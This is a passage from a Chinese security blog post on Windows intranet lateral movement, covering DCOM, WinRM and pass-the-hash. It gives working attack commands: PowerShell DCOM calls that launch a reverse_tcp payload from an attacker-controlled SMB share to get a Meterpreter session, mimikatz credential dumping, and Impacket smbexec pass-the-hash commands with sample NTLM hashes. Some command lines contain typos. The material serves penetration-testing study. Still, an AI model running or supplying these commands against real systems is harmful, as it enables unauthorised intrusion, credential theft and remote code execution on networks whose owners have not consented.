<p><strong>COM</strong>由一组构造规范和组件对象库组成。<strong>COM</strong>组件对象通过接口来描述自身，组件提供的所有服务都通过其接口公开。接口被定义为“在对象上实现的一组语义上相关的功能”，实质是一组函数指针表。每个指针必须初始化指向某个具体的函数体，一个组件对象实现的接口数量没有限制。<strong>COM</strong>指定了一个对象模型和编程要求，使<strong>COM</strong>对象能够与其他对象交互。这些对象可以在单个进程中，也可以在其他进程中，甚至可以在远程计算机上。<br>在<strong>Windows</strong>中，每个<strong>COM</strong>对象都由唯一的<strong>128</strong>位的二进制标识符标识，即<strong>GUID</strong>。<br>当<strong>GUID</strong>用于标识<strong>COM</strong>对象时，被称为<strong>CLSID</strong>（类标识符），当它用于标识接口时，被称为<strong>IID</strong>（接口标识符）。一些<strong>CLSID</strong>还具有<strong>ProgID</strong>，方便人们记忆。</p>
<h5 id="2-DCOM"><a href="#2-DCOM" class="headerlink" title="2.DCOM"></a>2.DCOM</h5><p><strong>DCOM</strong>（<strong>Distributed Component Object Model</strong>，分布式组件对象模型）是微软基于组件对象模型（<strong>COM</strong>）的一系列概念和程序接口，支持不同机器上的组件间的通信。利用<strong>DCOM</strong>，客户端程序对象能够请求来自网络中另一台计算机上的服务器程序对象。<br><strong>DCOM</strong>是<strong>COM</strong>的扩展，允许应用程序实例化和访问远程计算机上的<strong>COM</strong>对象的属性和方法。<strong>DCOM</strong>使用远程过程调用（<strong>RPC</strong>）技术将组件对象模型（<strong>COM</strong>）的功能扩展到本地计算机之外，因此，在远程系统上托管<strong>COM</strong>服务器端的软件（通常在<strong>DLL</strong>或<strong>EXE</strong>中）可以通过<strong>RPC</strong>向客户端公开其方法</p>
<h3 id="通过DCOM横向移动"><a href="#通过DCOM横向移动" class="headerlink" title="通过DCOM横向移动"></a>通过DCOM横向移动</h3><p>部分<strong>DCOM</strong>组件公开的接口中可能包含不安全的方法。例如，<strong>MMC20.Application</strong>提供的<strong>ExecuteShellCommand</strong>方法可以在单独的进程中运行指定的程序或命令。<br>执行以下命令，可以列出计算机上所有的<strong>DCOM</strong>程序组件</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_DCOMApplication</span><br></pre></td></tr></tbody></table></figure>

<p>测试人员可以枚举包含不安全方法的其他<strong>DCOM</strong>对象，并与远程计算机的<strong>DCOM</strong>进行交互，从而实现远程执行。注意需要具备以下条件：拥有管理员权限的<strong>PowerShell</strong>，远程主机未开启防火墙。<br>目前经常利用的<strong>DCOM</strong>组件有<strong>MMC20.Application</strong>、<strong>ShellWindows</strong>、<strong>Excel.Application</strong>、 <strong>ShellBrowserWindow</strong>等，下面简要介绍。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127211121076.png" alt="image-20231127211121076" style="zoom:80%;">



<h5 id="1-MMC20-Application"><a href="#1-MMC20-Application" class="headerlink" title="1.MMC20.Application"></a>1.MMC20.Application</h5><p><strong>MMC20.Application</strong>对象的<strong>Document.ActiveView</strong>下存在一个<strong>ExecuteShellCommand</strong>方法，可以用来启动子进程并运行执行的程序或系统命令</p>
<p>下面以<strong>MMC20.Application</strong>组件为例，在远程主机上执行攻击载荷，并上线<strong>Meterpreter</strong>。</p>
<ol>
<li><p>在一台可控的服务器上搭建SMB匿名共享服务，并将生成的攻击载荷放入共享目录，相关操作请参考前文。</p>
</li>
<li><p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过ProgID与DCOM进行远程交互，并创建MMC20.Application对象的实例</span><br><span class="line">$com</span><br><span class="line">[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.19")</span><br><span class="line"># 调用ExecuteShellCommand方法启动进程，以运行攻击载荷</span><br><span class="line">$com.Document.Activeview.ExecuteshellCommand('cmd.exe',$null,"/c \\192.168.2.143\evilsmb\ reverse_tcp.exe", "Minimized")</span><br></pre></td></tr></tbody></table></figure>

<p>通过<strong>MMC20.Application</strong>在远程主机（<strong>10.10.10.19</strong>）上启动进程，加载<strong>SMB</strong>共享中的攻击载荷并执行。图5-7-3表示远程主机成功上线。<br>在调用过程中，<strong>MMC20.Application</strong>会启动<strong>mmc.exe</strong>进程，通过<strong>ExecuteShellCommand</strong>方法在<strong>mmc.exe</strong>中创建子进程，如图5-7-4所示，适用于<strong>Windows7</strong>及以上版本的系统。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214507684.png" alt="image-20231127214507684" style="zoom:130%;">

<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214536758.png" alt="image-20231127214536758" style="zoom:130%;"></li>
</ol>
<h5 id="2-ShellWindows"><a href="#2-ShellWindows" class="headerlink" title="2.ShellWindows"></a>2.ShellWindows</h5><p><strong>ShellWindows</strong>组件提供了<strong>Document.Application.ShellExecute</strong>方法，如图5-7-5所示，可以启动子进程来运行指定的程序或系统命令，适用于<strong>Windows7</strong>及以上版本的系统。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214710780.png" alt="image-20231127214710780" style="zoom:120%;">

<p>由于<strong>ShellWindows</strong>对象没有<strong>ProgID</strong>，因此需要使用其<strong>CLSID</strong>来创建实例。通过<strong>OleViewDotNet</strong>，可以找到<strong>ShellWindows</strong>对象的<strong>CLSID</strong>为<strong>9BA05972-F6A8-11CF-A442-00A0C90A8F39</strong>，如图5-7-6所示。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127214854720.png" alt="image-20231127214854720" style="zoom:130%;">

<p>在管理员权限的<strong>PowerShell</strong>中执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellWindows对象的实例</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$com = [Activator]:CreateInstance([Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"10,10,10.19")</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.item().Document.Application.ShellExecute("cmd.exe","/c calc.exe","C：\Windows\</span><br><span class="line">System32",$null,0)</span><br></pre></td></tr></tbody></table></figure>

<p>即可通过<strong>ShellWindows</strong>在远程主机（<strong>10.10.10.19</strong>）上启动<strong>calc.exe</strong>。注意，<strong>ShellWindows</strong>并不会创建新进程，而是在已有<strong>explorer.exe</strong>进程中创建并执行子进程，如图5-7-7所示。</p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231127215638847.png" alt="image-20231127215638847" style="zoom:120%;">

<h5 id="3-ShellBrowserWindow"><a href="#3-ShellBrowserWindow" class="headerlink" title="3.ShellBrowserWindow"></a>3.ShellBrowserWindow</h5><p><strong>ShellBrowserWindow</strong>中也存在一个<strong>Document.Application.ShellExecute</strong>方法，与<strong>ShellWindows</strong>一样，但不会创建新进程，而是通过已有的<strong>explorer.exe</strong>来托管子进程。该方法只适用于<strong>Windows 10</strong>和<strong>Windows Server2012</strong>等版本的系统，利用方法如下。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 通过CLSID与DCOM进行远程交互，并创建ShellBrowserwindow对象的实例</span><br><span class="line">$com =[Activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-</span><br><span class="line">8455-00A0C91F3880","10.10.10.13")</span><br><span class="line"># 调用ShellExecute方法启动子进程</span><br><span class="line">$com.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)</span><br></pre></td></tr></tbody></table></figure>





<h2 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用?"></a>WinRM的利用?</h2><p><strong>WinRM</strong>是通过执行<strong>WS-Management</strong>协议（用于远程软件和硬件管理的Web服务协议）来实现远程管理的，允许处于一个共同网络内的<strong>Windows</strong>计算机彼此之间互相访问和交换信息，对应的端口是<strong>5985</strong>。在一台计算机启用<strong>WinRM</strong>服务后，防火墙会自动放行其相关通信端口，另一台计算机便能通过WiRM对其进行远程管理了。<br>注意，只有在<strong>Windows Server2008</strong>以上版本的服务器中，<strong>WinRM</strong>服务才会自动启动。测试人员通过<strong>WinRM</strong>服务进行横向移动时，需要拥有远程主机的管理员凭据信息。</p>
<p><strong>利用条件：</strong></p>
<p><strong>WinRS</strong> 适用于 <strong>Win server 2008 / Win7</strong> 及以后的系统，但是 <strong>Win server 2008 / PC</strong> 全版本系统默认关闭。</p>
<p>只有在<strong>Win server 2012</strong> 之后的版本的<strong>WinRM</strong>服务才默认启动并监听了<strong>5985</strong>端口，允许远程任意主机来管理。</p>
<p>执行以下命令查询<strong>WinRM</strong>状态：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object {$_.name -like "WinRM"}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h3><p><strong>Windows</strong>远程管理提供了以下两个命令行工具：</p>
<ol>
<li><strong>Winrs</strong>，允许远程执行命令的命令行工具，利用<strong>WS-Management</strong>协议</li>
<li><strong>Winrm (Winrm.cmd)<strong>，内置系统管理命令行工具，允许管理员配置本机的</strong>WinRM</strong>服务。</li>
</ol>
<p>注意，在默认情况下，无法通过<strong>WinRM</strong>连接到目标系统。在首次使用这些工具进行<strong>WinRM</strong>连接时，可能出现提示以下错误：<strong>Winrs error: WinRM</strong>客户端无法处理该请求。<br>在下列条件下，可以将默认身份验证与IP地址结合使用：</p>
<ol>
<li>传输为<strong>HTTPS</strong>或目标位于<strong>TrustedHosts</strong>列表中，并且提供了显式凭据</li>
<li>使用<strong>Winrm.cmd</strong>配置<strong>TrustedHosts</strong>。注意，<strong>TrustedHosts</strong>列表中的计算机可能未经过身份验证。有关如何设置<strong>TrustedHosts</strong>的详细信息，可以通过运行<code>winrm help config</code>命令来了解。</li>
</ol>
<p>执行以下命令，手动将目标的IP地址添加到客户端的信任列表（<strong>TrustedHosts</strong>）中如图5-8-1所示。也可以将<strong>TrustedHosts</strong>设置为<code>*</code>，从而信任所有主机。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/client @{TrustedHosts="192.168.111.137"}</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br><span class="line">#通过PowerShell</span><br></pre></td></tr></tbody></table></figure>





<h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递（<strong>Pass The Hash,PTH</strong>）是一种针对<strong>NTLM</strong>协议的攻击技术。在NTLM身份认证的第三步中生成<strong>Response</strong>时，客户端直接使用用户的<strong>NTLM</strong>哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在<strong>Windows</strong>系统中只使用用户哈希值对访问资源的用户进行身份认证。关于<strong>NTLM</strong>协议与<strong>NTLM</strong>协议的认证流程，请读者阅读后面的<strong>NTLM Relay</strong>专题。<br>因此，当测试人员获得有效的用户名和密码哈希值后，就能够使用该信息对远程主机进行身份认证，不需暴力破解获取明文密码即可获取该主机权限。该方法直接取代了窃取用户明文密码和暴力破解哈希值的需要，在内网渗透中十分经典在域环境中，用户登录计算机时一般使用域账号，并且大多数计算机在安装时可能会使用相同的本地管理员账号和密码。因此，在域环境进行哈希传递往往可以批量获取内网主机权限。</p>
<h3 id="1-利用mimikatz进行PTH"><a href="#1-利用mimikatz进行PTH" class="headerlink" title="1.利用mimikatz进行PTH"></a>1.利用mimikatz进行PTH</h3><p><strong>mimikatz</strong>中内设了哈希传递功能，<strong>需要本地管理员权限</strong></p>
<ol>
<li><p>将<strong>mimikatz</strong>上传到跳板机并执行以下命令：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit</span><br></pre></td></tr></tbody></table></figure>

<p>抓取用户<strong>hash</strong></p>
<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224115352296.png" class="" title="image-20231224115352296">


</li>
<li><p>利用mimikatz,使用抓取到的NTLM哈希进行PTH攻击</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:test.local /ntlm:161cff084477fe596a5db81874498a24" exit</span><br></pre></td></tr></tbody></table></figure>



<img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224122033021.png" class="" title="image-20231224122033021"></li>
</ol>
<h3 id="2-利用Impacket进行PTH"><a href="#2-利用Impacket进行PTH" class="headerlink" title="2.利用Impacket进行PTH"></a>2.利用Impacket进行PTH</h3><p><strong>Impacket</strong>项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有<strong>psexec.py</strong>、<strong>smbexec.py</strong>和<strong>wmiexec.py</strong>。在使用时，可以借助内网代理等技术对内网主机进行攻击。以<strong>smbexec.py</strong>为例，执行以下命令，通过进行哈希传递，获取远程主机<br>（10.10.10.19）的交互式命令行，如图5-9-3所示。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/ administrator@10.10.10.19</span><br><span class="line"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="line"># -hashes，指定用户完整的哈希值，如果LM Hash被废弃，就将其指定为O或为空</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes  :161cff084477fe596a5db81874498a24 test.local/Administrator@192.168.111.137</span><br><span class="line">#python smbexec.py -hashes LM HASH:NTLM HASH &lt;domain&gt;/&lt;username&gt;@&lt;IP&gt;</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">173dc846546fb0e838c0fd2ac2908c1f</span><br><span class="line">python smbexec.py -hashes :173dc846546fb0e838c0fd2ac2908c1f test.local/bob@192.168.111.136</span><br></pre></td></tr></tbody></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Bamboo22</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://example.com/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Bamboo22 's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://api.bimg.cc/random" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/" title="红日靶场一"><img class="cover" src="https://api.bimg.cc/random" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红日靶场一</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="JWT的攻击方法"><img class="cover" src="http://pic.bamboo22.top/120.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JWT的攻击方法</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://pic.bamboo22.top/image/bam2023-06-13233341.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Bamboo22</div><div class="author-info__description">热爱学习，分享技术</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bamb0022"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到Bamboo的博客！原博客已于2024年1月22日完成迁移，将会持续更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.</span> <span class="toc-text">内网横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="toc-number">1.1.</span> <span class="toc-text">横向移动中的文件传输</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E5%85%B1%E4%BA%AB-IPC"><span class="toc-number">1.1.1.</span> <span class="toc-text">通过网络共享($IPC)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%AD%E5%BB%BASMB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">搭建SMB服务器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E7%95%8C%E9%9D%A2%E5%BC%80%E5%90%AF%E5%8F%AF%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-number">1.1.2.2.1.</span> <span class="toc-text">通过界面开启可匿名访问的文件共享服务器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AF%E5%85%B1%E4%BA%AB"><span class="toc-number">1.1.2.2.2.</span> <span class="toc-text">使用命令行开启共享</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E4%B8%80%E9%94%AE%E5%BC%80%E5%90%AF"><span class="toc-number">1.1.2.2.3.</span> <span class="toc-text">脚本一键开启</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Windows%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.3.</span> <span class="toc-text">通过Windows自带工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Certutil"><span class="toc-number">1.1.3.0.1.</span> <span class="toc-text">1.Certutil</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-BITSAdmin"><span class="toc-number">1.1.3.0.2.</span> <span class="toc-text">2.BITSAdmin</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-Powershell"><span class="toc-number">1.1.3.0.3.</span> <span class="toc-text">3.Powershell</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">创建计划任务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">常规利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UNC%E8%B7%AF%E5%BE%84%E5%8A%A0%E8%BD%BD%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.2.</span> <span class="toc-text">UNC路径加载执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.</span> <span class="toc-text">利用系统服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.3.1.</span> <span class="toc-text">创建远程服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SCShell"><span class="toc-number">1.3.2.</span> <span class="toc-text">SCShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UAC-Remote-Restrictions"><span class="toc-number">1.3.3.</span> <span class="toc-text">UAC Remote Restrictions</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">远程桌面利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E7%A1%AE%E5%AE%9A%E5%92%8C%E5%BC%80%E5%90%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">远程桌面的确定和开启</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP-Hijacking"><span class="toc-number">1.4.2.</span> <span class="toc-text">RDP Hijacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SharpRDP"><span class="toc-number">1.4.3.</span> <span class="toc-text">SharpRDP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PsExec%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6"><span class="toc-number">1.5.</span> <span class="toc-text">PsExec远程控制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WMI%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">WMI的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">常规利用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.6.0.1.1.</span> <span class="toc-text">1.执行远程查询</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%9B%E5%BB%BA%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.6.0.1.2.</span> <span class="toc-text">2.创建远程进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%BF%9C%E7%A8%8B%E5%AE%89%E8%A3%85MSI%E6%96%87%E4%BB%B6"><span class="toc-number">1.6.0.1.3.</span> <span class="toc-text">3.远程安装MSI文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">1.6.1.</span> <span class="toc-text">常见利用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Wmiexec"><span class="toc-number">1.6.1.0.1.</span> <span class="toc-text">1.Wmiexec</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Invoke-WmiCommand"><span class="toc-number">1.6.1.0.2.</span> <span class="toc-text">2.Invoke-WmiCommand</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WMI%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">WMI事件订阅的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%89%8B%E5%8A%A8%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.1.1.1.</span> <span class="toc-text">1.手动利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Sharp-WMIEvent"><span class="toc-number">1.6.1.1.2.</span> <span class="toc-text">2.Sharp-WMIEvent</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#DCOM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.7.</span> <span class="toc-text">DCOM的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#COM%E5%92%8CDCOM"><span class="toc-number">1.7.1.</span> <span class="toc-text">COM和DCOM</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-com"><span class="toc-number">1.7.1.0.1.</span> <span class="toc-text">1.com</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-DCOM"><span class="toc-number">1.7.1.0.2.</span> <span class="toc-text">2.DCOM</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87DCOM%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.7.2.</span> <span class="toc-text">通过DCOM横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-MMC20-Application"><span class="toc-number">1.7.2.0.1.</span> <span class="toc-text">1.MMC20.Application</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-ShellWindows"><span class="toc-number">1.7.2.0.2.</span> <span class="toc-text">2.ShellWindows</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-ShellBrowserWindow"><span class="toc-number">1.7.2.0.3.</span> <span class="toc-text">3.ShellBrowserWindow</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WinRM%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">WinRM的利用?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87WinRM%E6%89%A7%E8%A1%8C%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4"><span class="toc-number">1.8.1.</span> <span class="toc-text">通过WinRM执行远程命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" 